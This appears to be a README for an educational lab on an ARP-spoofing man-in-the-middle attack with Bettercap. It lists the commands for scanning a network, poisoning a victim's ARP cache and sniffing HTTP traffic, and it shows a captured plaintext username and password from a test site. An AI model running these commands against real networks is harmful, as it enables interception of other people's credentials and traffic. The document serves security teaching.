# ARP-MITM-Bettercap
> ⚠️ **Disclaimer**: This project is for educational purposes only. Do **not** perform these actions on networks you do not own or have explicit permission to test. Unauthorized access is illegal.

## LAB SET-UP
### 💻 Attacker Machine

**OS**: Kali Linux 2024.1  

**Tool Used**: Bettercap  

**IP Address**: 192.168.1.5  

**Role**: Perform ARP spoofing, sniff HTTP traffic

### 🖥️ Victim Machine

**OS**: Ubuntu or Windows 10   

**Browser**: Firefox / Chrome  

**IP Address**: 192.168.1.10  

**Role**: Target of the attack, visiting HTTP websites

### 🌐 Network Setup

**Type**: Bridged Adapter (VirtualBox)  

**Interface**: `eth0` (for attacker)  

**Same Local Network**: Yes ✅   

  Check your network  interface:  
  ```bash
  ip a
  ```
  Check your Default gateway:(victim)
  ```bash
  ip route
  ```
Install **Bettercap** if not already installed:

```bash
 sudo apt update
 sudo apt install bettercap
 ```

1. **Start Bettercap:**
    ```bash
    sudo bettercap -iface eth0
    ```

2. **Scan Network:**
    ```bash
    net.probe on
    net.show
    ```

3. **Set Victim IP:**
    ```bash
    set arp.spoof.targets 192.168.1.10
    ```

4. **Launch Attack:**
    ```bash
    arp.spoof on
    http.proxy on
    net.sniff on
    ```

5. **Ask the victim to visit a non-HTTPS site** (for demonstration):
    ```
    http://testphp.vulnweb.com/login.php
    ```

6. **Captured Output:**
    ```
    POST /userinfo.php uname=Alok&pass=1234
    ```
---

## 📄 License
MIT

